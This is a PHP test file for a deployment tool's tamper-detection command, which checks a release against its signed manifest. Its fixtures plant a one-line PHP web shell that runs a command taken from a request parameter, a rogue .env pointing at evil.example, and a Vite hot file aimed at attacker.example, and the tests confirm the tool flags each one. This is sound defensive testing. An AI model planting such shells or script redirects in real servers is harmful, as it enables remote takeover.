<?php

namespace Slipstream\Tests\Feature;

use Illuminate\Support\Facades\Log;
use Slipstream\Console\Commands\VerifyCommand;
use Slipstream\Release\Core\Baseline;
use Slipstream\Tests\Support\ArtifactFixture;
use Slipstream\Tests\TestCase;

/**
 * slipstream:verify, the weekly change-detection check: the live release
 * against its signed manifest, with what the node writes itself left out.
 */
class VerifyCommandTest extends TestCase
{
    protected ArtifactFixture $fixture;

    protected string $release;

    protected function setUp(): void
    {
        parent::setUp();

        $this->fixture = (new ArtifactFixture)->configure()->writeCheckout()->package();
        $this->fixture->publish();
        $this->release = $this->fixture->unpackInto($this->fixture->appRoot.'/current');
    }

    protected function tearDown(): void
    {
        $this->fixture->remove();

        parent::tearDown();
    }

    public function test_a_clean_release_passes(): void
    {
        $this->artisan('slipstream:verify')
            ->expectsOutputToContain('verifies with key test-key')
            ->expectsOutputToContain('The release matches its signed manifest.')
            ->assertExitCode(0);

        $this->artisan('slipstream:verify', ['--release' => $this->release])->assertExitCode(0);
    }

    public function test_a_modified_file_fails_and_is_named(): void
    {
        file_put_contents($this->release.'/app/Hello.php', '<?php // tampered');

        $this->artisan('slipstream:verify')
            ->expectsOutputToContain('app/Hello.php')
            ->expectsOutputToContain('1 path(s) differ from the signed manifest')
            ->assertExitCode(1);
    }

    public function test_missing_and_unlisted_files_are_reported(): void
    {
        unlink($this->release.'/public/index.php');
        file_put_contents($this->release.'/public/shell.php', '<?php system($_GET["c"]);');

        $this->artisan('slipstream:verify')
            ->expectsOutputToContain('Missing')
            ->expectsOutputToContain('public/index.php')
            ->expectsOutputToContain('Not in the manifest')
            ->expectsOutputToContain('public/shell.php')
            ->assertExitCode(1);
    }

    public function test_what_the_node_writes_itself_is_ignored(): void
    {
        @mkdir($this->release.'/bootstrap/cache', 0777, true);
        file_put_contents($this->release.'/bootstrap/cache/config.php', '<?php return [];');
        // As a deploy does: optimize before the swap, then the record.
        file_put_contents($this->release.'/.slipstream/generated.json', Baseline::toJson(Baseline::record($this->release)));
        @mkdir($this->release.'/storage/logs', 0777, true);
        file_put_contents($this->release.'/storage/logs/laravel.log', 'noise');
        config()->set('slipstream.deploy.shared_paths', ['public/uploads' => 'shared/uploads']);
        @mkdir($this->release.'/public/uploads', 0777, true);
        file_put_contents($this->release.'/public/uploads/photo.jpg', 'jpg');

        $this->artisan('slipstream:verify')->assertExitCode(0);
    }

    /**
     * The node makes .env a link to the shared copy; a regular file there is
     * configuration nobody deployed.
     */
    public function test_an_env_file_in_place_of_the_link_is_drift(): void
    {
        file_put_contents($this->release.'/.env', "APP_KEY=base64:attacker\nDB_HOST=evil.example\n");

        $this->artisan('slipstream:verify')
            ->expectsOutputToContain('.env')
            ->assertExitCode(1);
    }

    /**
     * Each link the deploy makes must lead exactly where it points it: a
     * storage link aimed at storage/logs, or at the app root, serves logs,
     * sessions or the .env over HTTP.
     */
    public function test_every_link_the_node_makes_must_lead_exactly_where_the_deploy_points_it(): void
    {
        if (DIRECTORY_SEPARATOR === '\\') {
            $this->markTestSkipped('needs symlinks (run under WSL).');
        }

        $root = $this->fixture->appRoot;
        mkdir($root.'/storage/app/public', 0777, true);
        mkdir($root.'/storage/logs', 0777, true);
        mkdir($root.'/shared/uploads', 0777, true);
        config()->set('slipstream.deploy.shared_paths', ['public/uploads' => 'shared/uploads']);
        $link = function (string $path, string $target): void {
            if (is_link($this->release.'/'.$path)) {
                unlink($this->release.'/'.$path);
            } elseif (is_dir($this->release.'/'.$path)) {
                $this->removeTree($this->release.'/'.$path);
            }
            symlink($target, $this->release.'/'.$path);
        };

        // As a deploy leaves it.
        $link('storage', $root.'/storage');
        $link('.env', $root.'/.env');
        $link('public/storage', $this->release.'/storage/app/public');
        $link('public/uploads', $root.'/shared/uploads');
        $this->artisan('slipstream:verify')->assertExitCode(0);

        foreach ([
            ['public/storage', $this->release.'/storage/logs'],
            ['public/storage', $this->release.'/storage'],
            ['.env', $root.'/elsewhere.env'],
            ['public/uploads', $root],
        ] as [$path, $target]) {
            touch($root.'/elsewhere.env');
            $link($path, $target);
            $this->artisan('slipstream:verify')
                ->expectsOutputToContain($path)
                ->assertExitCode(1);
        }

        // The release's own storage link at the app root, and public/storage
        // through it: /storage/.env.
        $link('.env', $root.'/.env');
        $link('public/uploads', $root.'/shared/uploads');
        $link('storage', $root);
        $link('public/storage', $this->release.'/storage');
        $this->artisan('slipstream:verify')
            ->expectsOutputToContain('Symlinks')
            ->assertExitCode(1);
    }

    public function test_json_output_and_audit_lines(): void
    {
        $this->artisan('slipstream:verify --json')
            ->expectsOutputToContain('"ok": true')
            ->assertExitCode(0);

        config()->set('slipstream.audit.enabled', true);
        Log::spy();
        file_put_contents($this->release.'/app/Hello.php', '<?php // tampered');

        $this->artisan('slipstream:verify --audit')->assertExitCode(1);

        Log::shouldHaveReceived('info')->with('slipstream.artifact.verify_drift', \Mockery::on(
            fn (array $context) => $context['modified'] === 1 && $context['paths'] === ['app/Hello.php']
        ))->once();
    }

    public function test_in_git_mode_a_release_without_a_manifest_has_nothing_to_verify(): void
    {
        config()->set('slipstream.release.source', 'git');
        $plain = $this->fixture->appRoot.'/plain';
        mkdir($plain);
        file_put_contents($plain.'/RELEASE_SHA', str_repeat('c', 40));

        $this->artisan('slipstream:verify', ['--release' => $plain])
            ->expectsOutputToContain('Nothing to verify')
            ->assertExitCode(VerifyCommand::NOTHING_TO_VERIFY);
    }

    /**
     * Deleting the manifest must not silence the weekly check.
     */
    public function test_in_artifact_mode_a_missing_manifest_is_drift_and_audited(): void
    {
        config()->set('slipstream.audit.enabled', true);
        Log::spy();
        unlink($this->release.'/.slipstream/manifest.json');

        $this->artisan('slipstream:verify --audit')
            ->expectsOutputToContain('Cannot verify')
            ->assertExitCode(1);

        Log::shouldHaveReceived('info')->with('slipstream.artifact.verify_drift', \Mockery::on(
            fn (array $context) => str_contains($context['reason'], 'no usable manifest')
        ))->once();

        file_put_contents($this->release.'/.slipstream/manifest.json', '{"format":1,"broken');
        $this->artisan('slipstream:verify')->assertExitCode(1);
    }

    /**
     * The record of the caches sits in the release, as writable as the
     * caches. The deployment row keeps its hash, so a record deleted or
     * rewritten after the deploy is drift too.
     */
    public function test_a_cache_record_deleted_or_rewritten_after_the_deploy_is_drift(): void
    {
        @mkdir($this->release.'/bootstrap/cache', 0777, true);
        file_put_contents($this->release.'/bootstrap/cache/config.php', '<?php return [];');
        file_put_contents($this->release.'/.slipstream/generated.json', Baseline::toJson(Baseline::record($this->release)));
        \Slipstream\Models\Deployment::query()->create([
            'server_name' => 'test-node', 'sha' => $this->fixture->sha, 'branch' => 'production', 'trigger' => \Slipstream\Models\Deployment::TRIGGER_POLL,
            'status' => \Slipstream\Models\Deployment::STATUS_DEPLOYED, 'release_path' => $this->release,
            'meta' => ['artifact' => ['baseline_sha256' => hash_file('sha256', $this->release.'/.slipstream/generated.json')]],
        ]);
        $this->artisan('slipstream:verify')->assertExitCode(0);

        // Tampered, and the record rewritten to match.
        file_put_contents($this->release.'/bootstrap/cache/config.php', '<?php system($_GET["c"]); return [];');
        file_put_contents($this->release.'/.slipstream/generated.json', Baseline::toJson(Baseline::record($this->release)));
        $this->artisan('slipstream:verify')
            ->expectsOutputToContain('the recorded hashes were rewritten after the deploy')
            ->assertExitCode(1);

        unlink($this->release.'/.slipstream/generated.json');
        $this->artisan('slipstream:verify')
            ->expectsOutputToContain('the hashes recorded at deploy are gone')
            ->assertExitCode(1);
    }

    public function test_a_planted_vite_hot_file_or_php_under_public_storage_is_drift(): void
    {
        // Vite loads every script from the URL in public/hot.
        file_put_contents($this->release.'/public/hot', 'https://attacker.example');
        $this->artisan('slipstream:verify')
            ->expectsOutputToContain('public/hot')
            ->assertExitCode(1);
        unlink($this->release.'/public/hot');

        // public/storage is the node's, but only as a link into storage.
        mkdir($this->release.'/public/storage');
        file_put_contents($this->release.'/public/storage/x.php', '<?php system($_GET["c"]);');
        $this->artisan('slipstream:verify')
            ->expectsOutputToContain('public/storage/x.php')
            ->assertExitCode(1);
    }

    public function test_a_release_signed_with_the_old_defaults_still_does_not_excuse_public_hot(): void
    {
        // 0.6.1's publish signed these three into every manifest.
        $this->fixture->republishManifest(function (array $manifest): array {
            $manifest['generated'] = ['bootstrap/cache', 'public/storage', 'public/hot'];

            return $manifest;
        });
        $release = $this->fixture->unpackInto($this->fixture->appRoot.'/old-defaults');
        file_put_contents($release.'/public/hot', 'https://attacker.example');

        $this->artisan('slipstream:verify', ['--release' => $release])
            ->expectsOutputToContain('public/hot')
            ->assertExitCode(1);
    }

    public function test_public_storage_may_be_a_link_into_the_shared_storage_and_nowhere_else(): void
    {
        if (DIRECTORY_SEPARATOR === '\\') {
            $this->markTestSkipped('needs symlinks.');
        }

        mkdir($this->fixture->appRoot.'/storage/app/public', 0777, true);
        $this->removeTree($this->release.'/storage');
        symlink($this->fixture->appRoot.'/storage', $this->release.'/storage');
        symlink($this->release.'/storage/app/public', $this->release.'/public/storage');
        $this->artisan('slipstream:verify')->assertExitCode(0);

        unlink($this->release.'/public/storage');
        mkdir($this->fixture->appRoot.'/elsewhere');
        symlink($this->fixture->appRoot.'/elsewhere', $this->release.'/public/storage');
        $this->artisan('slipstream:verify')
            ->expectsOutputToContain('public/storage')
            ->assertExitCode(1);
    }

    public function test_without_the_release_environment_a_statement_cannot_be_checked(): void
    {
        config()->set('slipstream.release.environment', null);

        $this->artisan('slipstream:verify')
            ->expectsOutputToContain('SLIPSTREAM_RELEASE_ENVIRONMENT is not set')
            ->assertExitCode(1);
    }

    public function test_the_release_config_cannot_hide_a_signed_file(): void
    {
        // config/slipstream.php ships inside the archive: it is the build's word.
        config()->set('slipstream.artifacts.generated', ['app']);
        file_put_contents($this->release.'/app/Hello.php', '<?php // tampered');

        $this->artisan('slipstream:verify')
            ->expectsOutputToContain('app/Hello.php')
            ->assertExitCode(1);
    }

    public function test_a_generated_path_excuses_only_what_the_manifest_does_not_list(): void
    {
        $this->fixture->republishManifest(function (array $manifest): array {
            $manifest['generated'] = ['app'];

            return $manifest;
        });
        $release = $this->fixture->unpackInto($this->fixture->appRoot.'/second');
        file_put_contents($release.'/app/Added.php', '<?php // the node may write here');
        $this->artisan('slipstream:verify', ['--release' => $release])->assertExitCode(0);

        file_put_contents($release.'/app/Hello.php', '<?php // but not change what CI signed');
        $this->artisan('slipstream:verify', ['--release' => $release])
            ->expectsOutputToContain('app/Hello.php')
            ->assertExitCode(1);
    }

    public function test_the_generated_caches_are_compared_with_the_hashes_recorded_at_deploy(): void
    {
        // A release deployed before 0.6.1, with no deployment row saying otherwise.
        unlink($this->release.'/.slipstream/generated.json');
        $this->artisan('slipstream:verify')
            ->expectsOutputToContain('no hashes recorded')
            ->assertExitCode(0);

        @mkdir($this->release.'/bootstrap/cache', 0777, true);
        file_put_contents($this->release.'/bootstrap/cache/config.php', '<?php return [];');
        file_put_contents($this->release.'/.slipstream/generated.json', Baseline::toJson(Baseline::record($this->release)));
        $this->artisan('slipstream:verify')
            ->expectsOutputToContain('match the hashes recorded at deploy')
            ->assertExitCode(0);

        file_put_contents($this->release.'/bootstrap/cache/config.php', '<?php system($_GET["c"]); return [];');
        file_put_contents($this->release.'/bootstrap/cache/routes-v7.php', '<?php // new');
        $this->artisan('slipstream:verify')
            ->expectsOutputToContain('bootstrap/cache/config.php')
            ->assertExitCode(1);
    }
}
